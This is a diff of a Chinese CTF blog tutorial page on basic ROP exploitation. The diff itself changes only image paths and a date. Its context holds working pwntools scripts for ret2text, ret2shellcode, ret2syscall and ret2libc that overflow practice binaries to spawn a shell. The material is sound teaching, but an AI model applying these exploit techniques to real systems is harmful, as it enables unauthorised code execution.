@@ -104,39 +104,39 @@
 <meta property="og:site_name" content="KANGEL">
 <meta property="og:description" content="ret2text首先checksec，查看保护  开启了NX保护，IDA查看程序  很明显存在栈溢出漏洞，继续查看程序，发现有一处调用shell  想要程序调用system函数，需要input==secretcode，而secretcode每次都是随机的，所以只能通过栈溢出，让main函数的返回值为调用system函数的地方，查看该函数所在的位置  0x0804863A，接下来是找到函数返回的地址">
 <meta property="og:locale" content="Chinese">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/1.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/2.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/3.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/4.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/5.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/6.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/7.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/8.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/9.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/10.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/11.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/12.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/13.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/14.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/15.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/21.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/22.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/23.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/16.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/17.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/18.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/19.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/20.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/24.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/25.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/26.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/27.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/28.JPG">
-<meta property="og:updated_time" content="2019-06-08T04:19:45.334Z">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/1.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/2.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/3.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/4.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/5.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/6.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/7.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/8.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/9.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/10.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/11.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/12.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/13.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/14.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/15.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/21.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/22.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/23.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/16.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/17.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/18.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/19.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/20.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/24.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/25.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/26.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/27.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/28.JPG">
+<meta property="og:updated_time" content="2019-06-10T15:13:40.287Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN学习之基本ROP">
 <meta name="twitter:description" content="ret2text首先checksec，查看保护  开启了NX保护，IDA查看程序  很明显存在栈溢出漏洞，继续查看程序，发现有一处调用shell  想要程序调用system函数，需要input==secretcode，而secretcode每次都是随机的，所以只能通过栈溢出，让main函数的返回值为调用system函数的地方，查看该函数所在的位置  0x0804863A，接下来是找到函数返回的地址">
-<meta name="twitter:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/F:/blog/Hexo/source/_posts/PWN学习之基本ROP/1.JPG">
+<meta name="twitter:image" content="https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/1.JPG">
 
 
 
@@ -415,7 +415,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-06-08 04:19:45" itemprop="dateModified" datetime="2019-06-08T04:19:45Z">2019-06-08</time>
+                <time title="Modified: 2019-06-10 15:13:40" itemprop="dateModified" datetime="2019-06-10T15:13:40Z">2019-06-10</time>
               
             
           </span>
@@ -468,35 +468,35 @@
 
       
         <h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>首先checksec，查看保护</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\1.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/1.JPG" alt=""></p>
 <p>开启了NX保护，IDA查看程序</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\2.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/2.JPG" alt=""></p>
 <p>很明显存在栈溢出漏洞，继续查看程序，发现有一处调用shell</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\3.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/3.JPG" alt=""></p>
 <p>想要程序调用system函数，需要input==secretcode，而secretcode每次都是随机的，所以只能通过栈溢出，让main函数的返回值为调用system函数的地方，查看该函数所在的位置</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\4.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/4.JPG" alt=""></p>
 <p>0x0804863A，接下来是找到函数返回的地址，并将其覆盖</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\5.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/5.JPG" alt=""></p>
 <p>0xffffd338-0xffffd2cc = 108，于是构造payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">addr = <span class="number">0x0804863A</span></span><br><span class="line">payload = (<span class="number">108</span>+<span class="number">4</span>) * <span class="string">'a'</span> + p32(addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>例题：jarvisOJ level0</p>
 <h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>首先checksec</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\6.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/6.JPG" alt=""></p>
 <p>32位程序，没有开启任何保护，IDA查看程序</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\7.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/7.JPG" alt=""></p>
 <p>有栈溢出，例外，strncpy()函数将gets的内容写入buf2中。于是攻击思路如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将shellcode写入buf2中，然后利用栈溢出将函数返回地址覆盖为buf2的地址。例外有一点需要注意的是，shellcode长度不能超过0x64，buf2部分可写可执行</span><br></pre></td></tr></table></figure>
 <p>查看buf2的地址</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\8.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/8.JPG" alt=""></p>
 <p>可以看到buffer位于.bss段的0x0804A080处，接下来查看此处地址的权限</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\9.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/9.JPG" alt=""></p>
 <p>vmmap查看内存，0xa080+0x64=0xa0c4，有可写可读可执行权限。于是构造payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> hex(len(shellcode))   <span class="comment">#0x2c</span></span><br><span class="line">buf = <span class="number">0x0804a080</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">'a'</span>) + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>例题：jarvisOJ level1</p>
 <h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>首先checksec</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\10.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/10.JPG" alt=""></p>
 <p>开启NX，IDA查看程序</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\11.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/11.JPG" alt=""></p>
 <p>没有系统函数和shellcode，但是依然有栈溢出，这时候可以利用系统调用。下面介绍几个相关知识：</p>
 <p>执行系统调用的指令是 int 0x80</p>
 <p>系统调用获取shell的函数是 execve(“/bin/sh”,NULL,NULL)</p>
@@ -511,50 +511,50 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'int'</span></span><br></pre></td></tr></table></figure>
 <p>还有一点需要注意的是:ret操作会执行一次pop并作为跳转地址</p>
 <p>首先找eax</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\12.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/12.JPG" alt=""></p>
 <p>选取如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure>
 <p>再找ebx</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\13.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/13.JPG" alt=""></p>
 <p>选取如下，一举三得</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
 <p>查找”/bin/sh”</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\14.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/14.JPG" alt=""></p>
 <p>查找int 0x80</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\15.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/15.JPG" alt=""></p>
 <p>编写脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./rop"</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><p>首先checksec</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\21.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/21.JPG" alt=""></p>
 <p>32位程序，NX开启。IDA查看程序</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\22.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/22.JPG" alt=""></p>
 <p>存在栈溢出漏洞，Get shell最直接的方法就是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">改写程序返回地址为so库中system函数的地址，同时布置好栈，将参数“/bin/sh\x00”放在’返回地址往后两个单位内存地址’处即可</span><br></pre></td></tr></table></figure>
 <p>查看system函数和”/bin/sh”的地址</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\23.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/23.JPG" alt=""></p>
 <p>编写脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,bin_sh])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>例题：jarvisOJ level2</p>
 <h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><p>首先checksec</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\16.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/16.JPG" alt=""></p>
 <p>32位程序，开启了NX。IDA查看程序</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\17.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/17.JPG" alt=""></p>
 <p>有栈溢出，并且有system函数和gets函数，攻击思路：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用gets函数向.bss段中写入“/bin/sh”，再调用系统函数执行system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
 <p>gdb查看system函数和gets函数在plt表中的位置</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\18.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/18.JPG" alt=""></p>
 <p>找一个buf来存储写入的”/bin/sh”</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\19.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/19.JPG" alt=""></p>
 <p>再找一个gadget连接gets和buf2，即ebx</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\20.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/20.JPG" alt=""></p>
 <p>编写脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">get_addr = <span class="number">0x08048460</span></span><br><span class="line">system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,get_addr,pop_ebx,buf2,system_addr,<span class="string">'aaaa'</span>,buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>该方法同样适用于ret2libc1</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">get_addr = <span class="number">0x08048430</span></span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx = <span class="number">0x0804841d</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,get_addr,pop_ebx,buf2,system_addr,<span class="string">'aaaa'</span>,buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"cat flag &gt; 111"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>首先checksec</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\24.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/24.JPG" alt=""></p>
 <p>32位程序，NX开启。IDA查看</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\25.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/25.JPG" alt=""></p>
 <p>有栈溢出，无system函数。下面介绍两个知识点：</p>
 <p>1、system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的，也就是说要找基地址。举个例子：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts真实地址-puts偏移地址 = system真实地址-system偏移地址 = 基地址</span><br></pre></td></tr></table></figure>
@@ -564,17 +564,17 @@
 <p>1、<a href="https://libc.blukat.me" target="_blank" rel="noopener">https://libc.blukat.me</a></p>
 <p>2、<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
 <p>objdump看一下got表有哪些</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\26.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/26.JPG" alt=""></p>
 <p>因为PIE是关闭的，所以可以直接去puts出got表中puts的内容，并且返回到面函数</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(elf.plt[<span class="string">'puts'</span>]) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'!?'</span>,payload)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br></pre></td></tr></table></figure>
 <p>然后根据got表中puts的内容找到相应的libc</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\27.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/27.JPG" alt=""></p>
 <p>这样就可以求出libc的基地址，system的地址和“/bin/sh”的地址</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(system_addr) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'!?'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>但是这样有个小问题，第二次调用main函数的时候，esp和ebp的相对偏移发生了变化，payload应为</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(system_addr) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
 <p>利用cyclic来判断</p>
-<p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\28.JPG" alt=""></p>
+<p><img src="/2019/05/18/PWN学习之基本ROP/28.JPG" alt=""></p>
 <p>于是编写脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,puts_plt,main,puts_got])</span><br><span class="line">sh.sendlineafter(<span class="string">"Can you find it !?"</span>,payload)</span><br><span class="line">puts_addr = 